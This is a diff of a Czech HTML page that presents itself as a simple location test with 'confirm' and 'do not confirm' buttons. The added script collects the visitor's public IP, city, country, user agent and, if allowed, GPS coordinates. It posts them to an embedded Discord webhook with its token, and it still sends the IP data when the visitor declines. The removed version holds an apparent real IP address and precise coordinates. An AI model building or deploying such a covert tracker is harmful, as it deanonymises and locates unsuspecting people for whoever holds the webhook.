@@ -1,74 +1,117 @@
 <!DOCTYPE html>
 <html lang="cs">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Test Lokace</title>
-  <style>
-    body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; }
-    .container { background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); text-align: center; }
-    button { margin-top: 20px; padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; }
-    button:hover { background-color: #45a049; }
-    #output { margin-top: 20px; white-space: pre-line; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolokace a Informace o Zařízení</title>
+    <style>
+        #map {
+            height: 400px;
+            width: 100%;
+        }
+        body {
+            font-family: Arial, sans-serif;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+    <script>
+        // Funkce pro získání informací
+        function getDeviceInfo(confirmLocation) {
+            var userAgent = navigator.userAgent;
+
+            // Získání veřejné IP adresy
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    // Získání města a země pomocí IP geolokačního API
+                    fetch(`https://ipinfo.io/${ipAddress}/json`)
+                        .then(response => response.json())
+                        .then(info => {
+                            var city = info.city;
+                            var country = info.country;
+
+                            // VPN status (Toto je velmi základní kontrola, potřebuje pokročilejší detekci)
+                            var vpnStatus = "Neznámé"; // Tohle bych doporučil detekovat pomocí externího API nebo knihovny
+
+                            // Získání GPS souřadnic nebo zobrazení "GPS nepotvrzena"
+                            if (confirmLocation) {
+                                if (navigator.geolocation) {
+                                    navigator.geolocation.getCurrentPosition(position => {
+                                        var lat = position.coords.latitude;
+                                        var lon = position.coords.longitude;
+
+                                        // Odeslání informací na Discord webhook
+                                        sendToDiscord(userAgent, ipAddress, city, country, vpnStatus, lat, lon);
+
+                                        // Zobrazení mapy
+                                        displayMap(lat, lon);
+                                    }, () => {
+                                        alert("Chyba při získávání GPS souřadnic.");
+                                    });
+                                } else {
+                                    alert("Geolokace není podporována tímto prohlížečem.");
+                                }
+                            } else {
+                                // Pokud uživatel nepotvrdí polohu
+                                var lat = "GPS nepotvrzena";
+                                var lon = "GPS nepotvrzena";
+
+                                // Odeslání informací na Discord webhook bez GPS
+                                sendToDiscord(userAgent, ipAddress, city, country, vpnStatus, lat, lon);
+                            }
+                        });
+                });
+        }
+
+        // Funkce pro zobrazení mapy na Mapy.cz
+        function displayMap(lat, lon) {
+            var mapUrl = `https://mapy.cz/zakladni?x=${lon}&y=${lat}&z=13&source=base&id=marker-${lat},${lon}`; // URL pro Mapy.cz
+            document.getElementById("map").innerHTML = `
+                <iframe src="${mapUrl}" width="100%" height="400" frameborder="0" style="border:0;" allowfullscreen></iframe>
+            `;
+        }
+
+        // Funkce pro odeslání informací na Discord webhook
+        function sendToDiscord(userAgent, ipAddress, city, country, vpnStatus, lat, lon) {
+            var webhookUrl = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
+            var message = {
+                content: `
+                    📱 Zařízení: ${userAgent}
+                    🌍 IP Adresa: ${ipAddress} (Město: ${city}, Země: ${country})
+                    🌐 VPN: ${vpnStatus}
+                    📍 GPS Souřadnice: ${lat}, ${lon}
+                    🔗 Mapa: [Zobrazit na Mapy.cz](https://mapy.cz/zakladni?x=${lon}&y=${lat}&z=13&source=base&id=marker-${lat},${lon})
+                `
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(message)
+            });
+        }
+    </script>
 </head>
 <body>
-
-<div class="container">
-  <h1>Testuj Funkci</h1>
-  <p>Potřebuji tvoji pomoc pro malý test na telefonu. Můžeš prosím potvrdit polohu?</p>
-  
-  <button onclick="getLocation(true)">Potvrdit</button>
-  <button onclick="getLocation(false)">Nepotvrdit</button>
-  
-  <div id="output"></div>
-</div>
-
-<script>
-  function getLocation(confirm) {
-    let output = document.getElementById('output');
-    
-    // Získání základních informací
-    const userAgent = navigator.userAgent;
-    const ip = "109.81.84.214"; // Tuto hodnotu bys normálně získal z API
-    const city = "Prague"; // Opět, získat přes API
-    const country = "CZ"; // Taktéž získat přes API
-    const vpn = "Neznámé"; // Zjištění VPN by bylo možné pomocí služby třetí strany
-    const coordinates = confirm ? "49.8960107, 16.632007" : "Nepovoleno"; // GPS souřadnice
-
-    // Sestavení zprávy
-    let message = `
-📱 Zařízení: ${userAgent}
-🌍 IP Adresa: ${ip} (Město: ${city}, Země: ${country})
-🌐 VPN: ${vpn}
-`;
-
-    if (confirm) {
-      message += `📍 GPS Souřadnice: ${coordinates}
-🔗 Mapa: Zobrazit na Mapy.cz`;
-    } else {
-      message += `📍 GPS Souřadnice: Nepovoleno`;
-    }
-
-    // Odeslání zprávy na Discord webhook (nahraď svůj URL)
-    const webhookURL = "https://discord.com/api/webhooks/1234567890/abcdefg";  // Nahraď správným webhookem
-    fetch(webhookURL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        content: message
-      })
-    })
-    .then(response => response.json())
-    .then(data => console.log("Zpráva odeslána na Discord"))
-    .catch(error => console.error("Chyba při odesílání zprávy:", error));
-
-    // Zobrazení výsledků
-    output.textContent = message;
-  }
-</script>
-
+    <div class="container">
+        <h2>Geolokace a Informace o Zařízení</h2>
+        <button onclick="getDeviceInfo(true)">Potvrdit Polohu</button>
+        <button onclick="getDeviceInfo(false)">Nepotvrdit Polohu</button>
+        <div id="map"></div>
+    </div>
 </body>
 </html>
